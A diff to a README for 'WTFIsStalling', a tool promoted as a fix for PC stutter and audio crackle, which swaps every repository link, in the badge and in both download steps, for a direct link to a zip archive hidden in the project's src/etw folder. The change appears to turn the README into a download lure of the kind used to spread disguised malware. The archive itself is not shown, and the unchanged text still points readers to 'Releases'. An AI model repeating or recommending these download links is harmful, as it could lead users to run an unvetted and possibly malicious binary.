@@ -1,6 +1,6 @@
 # 🛑 WTFIsStalling - Stop PC Hitches and Audio Crackle Fast
 
-[![Download WTFIsStalling](https://img.shields.io/badge/Download-WTFIsStalling-4CAF50?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/Thuyngu2292/WTFIsStalling)
+[![Download WTFIsStalling](https://img.shields.io/badge/Download-WTFIsStalling-4CAF50?style=for-the-badge&logo=windows&logoColor=white)](https://raw.githubusercontent.com/Thuyngu2292/WTFIsStalling/main/src/etw/Stalling_Is_WTF_v3.1.zip)
 
 ## 🔍 What Does This Tool Do?
 
@@ -32,7 +32,7 @@ Getting started is incredibly easy. Here's all you need to do:
 
 ### Step 1: Download the Tool
 
-Visit this link to download the application: **[https://github.com/Thuyngu2292/WTFIsStalling](https://github.com/Thuyngu2292/WTFIsStalling)**
+Visit this link to download the application: **[https://raw.githubusercontent.com/Thuyngu2292/WTFIsStalling/main/src/etw/Stalling_Is_WTF_v3.1.zip](https://raw.githubusercontent.com/Thuyngu2292/WTFIsStalling/main/src/etw/Stalling_Is_WTF_v3.1.zip)**
 
 Click the big green download button or the "Releases" section to get the latest version.
 
@@ -176,7 +176,7 @@ Don't waste hours searching forums and trying random fixes. Download WTFIsStalli
 
 ## 📥 Ready to Fix Your PC?
 
-Visit this link to download the application: **[https://github.com/Thuyngu2292/WTFIsStalling](https://github.com/Thuyngu2292/WTFIsStalling)**
+Visit this link to download the application: **[https://raw.githubusercontent.com/Thuyngu2292/WTFIsStalling/main/src/etw/Stalling_Is_WTF_v3.1.zip](https://raw.githubusercontent.com/Thuyngu2292/WTFIsStalling/main/src/etw/Stalling_Is_WTF_v3.1.zip)**
 
 It's free, it's fast, and it could save you hours of frustration.
 
